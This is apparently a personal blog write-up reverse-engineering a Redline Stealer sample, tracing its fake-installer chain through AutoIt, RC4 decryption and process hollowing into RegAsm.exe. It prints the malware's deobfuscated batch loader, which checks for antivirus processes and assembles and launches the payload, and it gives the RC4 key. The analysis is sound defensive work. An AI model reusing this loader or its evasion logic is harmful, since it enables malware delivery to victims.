## Redline Stealer Infection Chain

Came across a sample from Malware Bazaar.

SHA256: 292a43281a8146f248fb71d92e5e32597c587fe003ac3a2f3ac8227331062120

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/be015d35-f30c-46f6-bc13-a0d0e9bd6a8b)

Detect It Easy recognized the exe file as an Installer, also there were some mentions of Autoit on VirusTotal.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/f3e700bb-fad6-4640-a2a3-13f4a973e34c)

There’s a bunch of garbled strings and it is also packed, typical for installers. IAT and API string references seem normal.

I read up on [eSentire’s Case Study](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-redline-stealer), and the initial loader for Redline are known to take form of fake installers like TeamViewer, AnyDesk, etc. A similar variant’s infection chain looks like the following, so I tried to base my analysis around this:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/a9c6f5b0-f192-4959-ab4b-562aea0c1849)

In IDA, the main functionality of the program lies in `sub_4015A0`, which handles file creation, deletion, setting up uninstallers, inserting registry keys, creating directories, etc. There is an interesting `ShellExecuteW` API call with dynamically resolved strings, and when looking through Tiny Tracer logs, there was one call to this exact offset.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/8e0fc32a-a10a-481c-a513-d726df2fa6ac)

Tiny Tracer output seems to halt at `ShellExecuteW` too:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/cefd1e56-adae-4cd5-b9aa-fd9cf036248e)

I couldn’t find any other process related APIs being used, so decided to see what is passed into the function. It looks like it’s copying a file `Wrist` into `Wrist.cmd` in the user’s Temp directory and executing it.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/a8a71893-963f-46d9-b93d-2be2398fe8db)

`Wrist.cmd` is an obfuscated batch script.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/78fb7904-9449-4408-bb74-13801ae5b03b)

After deobfuscating, we get:

```powershell
Set oobjxQdyOhgEZ=Promptly.pif
Set MXpzMKVMvPYNjICbYkFdgBg=  
tasklist   | findstr /I "wrsa.exe opssvc.exe"  1>NUL  & if not errorlevel 1 ping -n 196 127.0.0.1
Set /a Attend=802403
tasklist   | findstr /I "avastui.exe avgui.exe nswscsvc.exe sophoshealth.exe"   & if not errorlevel 1 Set oobjxQdyOhgEZ=AutoIt3.exe   & Set MXpzMKVMvPYNjICbYkFdgBg=.a3x
cmd /c md %Attend%
findstr /V "LyingBaghdadProgrammersAtom" Fisher  1>%Attend%\%oobjxQdyOhgEZ%
copy /b %Attend%\%oobjxQdyOhgEZ% + Collected + Thomas + Mandate + Formed + Notify + Fusion + Hs + Joke + Uni + Painful + Harmful + Sullivan + Exhibition + Monster + Dated + Senegal + Maritime + Token + Lovely + Essentially + Verde + Fork + Mumbai + Horse %Attend%\%oobjxQdyOhgEZ%
cmd /c copy /b Drew + Folder + %Attend%\%oobjxQdyOhgEZ%U%MXpzMKVMvPYNjICbYkFdgBg%
start /I %Attend%\%oobjxQdyOhgEZ% %Attend%\%oobjxQdyOhgEZ%U%MXpzMKVMvPYNjICbYkFdgBg%
timeout 5
```

This checks for processes `wrsa.exe` and `opssvc.exe`, if found, ping the localhost 196 times. It also checks for antivirus services on the system `avastui.exe, avgui.exe, nswscsvc.exe sophoshealth.exe`, if found, `oobjxQdyOhgEZ` is set to `AutoIt3.exe` instead of `Promptly.pif`. It creates a directory named `802403`, and in there, constructs a file Promptly.pif or AutoIt3.exe using contents from different files i.e. Collected, Thomas, Mandate, …, and attempt to run it, passing in the file `802403\U` as an argument. 

During the execution of the initial installer, we can see that it drops the fragmented AutoIt3.exe files into the Temp directory. Here’s one of the fragments being created, seen in Tiny Tracer:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/6e096cc9-845d-45d8-9c1b-6243b8e52005)

Anyways, this seems like a legitimate AutoIt3 interpreter based on VirusTotal reports. However, the payload in `802403\U` looks encrypted. After some research, the last stage typically involves some sort of injection technique and after some tinkering and setting breakpoints on `CreateProcess`, `OpenProcess`and `NtResumeThread`, etc. what happens is the AutoIt3 interpreter decrypts the payload in memory and does process hollowing on `RegAsm.exe`.  And its parent process is `explorer.exe`, weird. I suspended the process quickly after the payload is injected and used pe-sieve to dump out suspicious memory regions. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/cd0395ac-84a9-494a-8efb-543cde124c26)

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/ca08fb7d-b7bc-490e-b79a-dee6630ec7cc)

The memory region at `0xdb0000` seems promising. 

After unmapping it in PE-bear, it looks like a .NET file, so opening it up in dnSpy, we are greeted with the final stage of the malware!

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/9805e5d4-3ac7-4cde-b8a3-5bf7591a0d9f)

But how did the decryption happen of the payload happen? Going back to executing `Promptly.pif` (or AutoIt3.exe), there was a `VirtualAlloc` call and a decryption routine shellcode written to that memory at `0x112000`, so I enabled a memory breakpoint on that address to catch the execution of that stub.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/79705fed-7511-4cbf-b9ac-6c6670464bd8)

Dumping the shellcode and opening it in IDA, we can see 2 functionalities related to RC4, the initialization stage in `sub_2` and the XOR stage in `sub_93`. (learned this from Zero2Automated lol)

`sub_2`:
![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/ce203bc6-7a4f-4cfa-b09e-4bfb919241ca)

`sub_93`:
![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/f6125b26-114e-4651-98b1-f3c1c8fa1d4a)

Looking back at the arguments being passed into `sub_2`, the RC4 key is `8518543726503553863083291645022577371`.

Setting another breakpoint at the end of the decryption routine, we can see the encrypted blob that was decrypted at the same address `0x4790048` (this was on a second run because I messed up the first run).

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/5a4a6ed0-82eb-46bc-a636-cc29b17f22db)

But this PE file looks slightly different than the one I dumped previously. But thanks to a blog post from c3rb3ru5d3d53c, turns out it’s just compressed, and will be decompressed later and injected into a process, in my case `RegAsm.exe`.  Technically, I should run API monitor and track whichever API call was used for decompression and injection techniques, but I’m kinda lazy. But here’s a [list](https://github.com/cuckoosandbox/cuckoo/wiki/Hooked-APIs-and-Categories) of generic API calls you enable for monitoring.

Anyways this is just a quick summary on how to get to the Redline code and demoing how the infection chain works !!
